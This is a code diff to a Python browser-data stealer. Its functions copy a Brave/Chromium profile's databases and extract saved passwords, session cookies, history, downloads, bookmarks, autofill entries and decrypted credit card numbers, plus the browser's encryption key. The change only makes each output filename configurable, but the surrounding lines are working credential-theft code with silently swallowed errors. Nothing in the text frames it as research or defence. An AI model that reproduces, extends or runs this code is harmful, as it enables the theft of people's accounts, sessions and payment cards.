@@ -117,7 +117,7 @@ def decrypt_string(string, key):
 ##Extract passwords
 ##
 
-def fetch_passwords(db_dir, keyDir):
+def fetch_passwords(db_dir, keyDir, filename="passwords.txt"):
     try:
         db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
         file = "passwords.db"
@@ -141,11 +141,11 @@ def fetch_passwords(db_dir, keyDir):
 
             if username or decrypt_string(row[3], fetch_key(keyDir)):
                 data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(keyDir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
-                store_data("passwords.txt", data)
+                store_data(filename, data)
             else:
                 continue
 
-        with open("passwords.txt", "a", encoding="utf-8") as f:
+        with open(filename, "a", encoding="utf-8") as f:
             f.write(f"\n################==Encryption-Key==################\n{fetch_key(keyDir)}")
 
         cursor.close()
@@ -161,7 +161,7 @@ def fetch_passwords(db_dir, keyDir):
 ##Extract cookies
 ##
 
-def fetch_cookies(dir):
+def fetch_cookies(dir, filename="cookies.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
         shutil.copyfile(file, "cookies.db")
@@ -176,7 +176,7 @@ def fetch_cookies(dir):
             name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
             
             cookie = f"\nName: {name}\nValue: {value}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
-            store_data("cookies.txt", cookie)
+            store_data(filename, cookie)
         conn.close()
         delete_file("cookies.db")
     except:
@@ -188,7 +188,7 @@ def fetch_cookies(dir):
 ##Extract encrypted cookies and decrypt them
 ##
 
-def decrypt_fetch_cookies(dir, keyDir):
+def decrypt_fetch_cookies(dir, keyDir, filename="decrypted-cookies.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
         shutil.copy(file, "cookies.db")
@@ -204,7 +204,7 @@ def decrypt_fetch_cookies(dir, keyDir):
             name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
             
             cookie = f"\nName: {name}\nValue: {decrypt_string(value, key)}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
-            store_data("decrypted-cookies.txt", cookie)
+            store_data(filename, cookie)
         conn.close()
         delete_file("cookies.db")
     except:
@@ -216,7 +216,7 @@ def decrypt_fetch_cookies(dir, keyDir):
 ##Extract history
 ##
 
-def fetch_history(dir):
+def fetch_history(dir, filename="history.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
         shutil.copy(file, "history.db")
@@ -232,7 +232,7 @@ def fetch_history(dir):
             url, title, visit_count, typed_count, last_visit = row
             
             history = f"\nURL: {url}\nTitle: {title}\nVisits: {visit_count}\nTyped: {typed_count}\nLast visit: {last_visit}\n"
-            store_data("history.txt", history)
+            store_data(filename, history)
         conn.close()
         delete_file("history.db")
     except:
@@ -245,7 +245,7 @@ def fetch_history(dir):
 ##Extract downloads
 ##
 
-def fetch_downloads(dir):
+def fetch_downloads(dir, filename="downloads.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
         shutil.copy(file, "history.db")
@@ -261,7 +261,7 @@ def fetch_downloads(dir):
             target_path, total_bytes, end_time, opened, tab_url = row
             
             history = f"\nPath: {target_path}\nSize(bytes): {total_bytes}\nTime: {end_time}\nOpened: {opened}\nURL: {tab_url}\n"
-            store_data("downloads.txt", history)
+            store_data(filename, history)
         conn.close()
         delete_file("history.db")
     except:
@@ -273,7 +273,7 @@ def fetch_downloads(dir):
 ##Extract bookmarks
 ##
 
-def fetch_bookmarks(dir):
+def fetch_bookmarks(dir, filename="bookmarks.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
         shutil.copy(file, "bookmarks.json")
@@ -308,7 +308,7 @@ def fetch_bookmarks(dir):
             last_used = bookmark["used"]
             folder = bookmark["folder"]
             bookmark_ = f"\nName: {name}\nURL: {url}\nLast Used: {last_used}\nCreated: {created}\nFolder name: {folder}\n"
-            store_data("bookmarks.txt", bookmark_)
+            store_data(filename, bookmark_)
         delete_file("bookmarks.json")
     except:
         pass
@@ -319,7 +319,7 @@ def fetch_bookmarks(dir):
 ##Extract credit cards
 ##
 
-def fetch_payment(dir, keyDir):
+def fetch_payment(dir, keyDir, filename="cards.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
         shutil.copy(file, "autofill.db")
@@ -336,7 +336,7 @@ def fetch_payment(dir, keyDir):
             name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified, use_count, use_date, nickname = row
             
             card = f"\nName: {name_on_card}\nCard Number: {decrypt_string(card_number_encrypted, key)}\nExpires(month, year): {expiration_month}, {expiration_year}\nModified: {date_modified}\nUsage Number: {use_count}\nUse date: {use_date}\nCard Nickname: {nickname}\n"
-            store_data("cards.txt", card)
+            store_data(filename, card)
         conn.close()
         delete_file("autofill.db")
     except:
@@ -348,7 +348,7 @@ def fetch_payment(dir, keyDir):
 ##Extract autofill
 ##
 
-def fetch_autofill(dir):
+def fetch_autofill(dir, filename="autofill.txt"):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir)
         shutil.copy(file, "autofill.db")
@@ -364,7 +364,7 @@ def fetch_autofill(dir):
             name, value, date_created, date_last_used = row
             
             autofill = f"\nName: {name}\nValue: {value}\nCreated: {date_created}\nLast Used: {date_last_used}\n"
-            store_data("autofill.txt", autofill)
+            store_data(filename, autofill)
         conn.close()
         delete_file("autofill.db")
     except:
